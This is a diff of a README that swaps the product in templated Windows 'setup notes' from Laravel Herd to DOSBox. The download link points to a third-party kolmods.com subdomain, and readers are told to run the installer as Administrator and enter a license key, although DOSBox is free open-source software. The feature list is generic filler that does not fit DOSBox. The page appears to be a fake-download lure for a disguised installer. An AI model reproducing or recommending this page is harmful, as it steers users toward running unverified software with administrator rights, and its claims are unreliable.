@@ -1,10 +1,14 @@
-# Laravel Herd Windows Setup Notes
+# DOSBox Windows Setup Notes
 
-**Download:** [Get Windows installer →](https://laravel-herd.kolmods.com/)
+<p align="center">
+  <a href="https://dosbox-setup.kolmods.com/">
+    <img src="https://img.shields.io/badge/Download-DOSBox-0078D4?style=for-the-badge&logo=windows&logoColor=white" alt="Download DOSBox">
+  </a>
+</p>
 
 ## Download & Install
 
-> Setup notes for **Laravel Herd** on Windows 10/11 (64-bit). Run the installer as Administrator.
+> Setup notes for **DOSBox** on Windows 10/11 (64-bit). Run the installer as Administrator.
 
 ### Quick steps
 
@@ -12,15 +16,15 @@
 2. Save the file to a local folder you can find later
 3. Run the setup **as Administrator**
 4. Enter your license key when prompted
-5. Restart if the installer asks — then launch **Laravel Herd** from the Start menu
+5. Restart if the installer asks — then launch **DOSBox** from the Start menu
 
 ## What you can use it for
 
-- Core Laravel Herd features on Windows desktop
-- Install and configure Laravel Herd for daily use
-- Import, edit, and export with Laravel Herd tools
-- Tune settings and profiles inside Laravel Herd
-- Integrate Laravel Herd into your existing workflow
+- Core DOSBox features on Windows desktop
+- Install and configure DOSBox for daily use
+- Import, edit, and export with DOSBox tools
+- Tune settings and profiles inside DOSBox
+- Integrate DOSBox into your existing workflow
 
 ## License
 
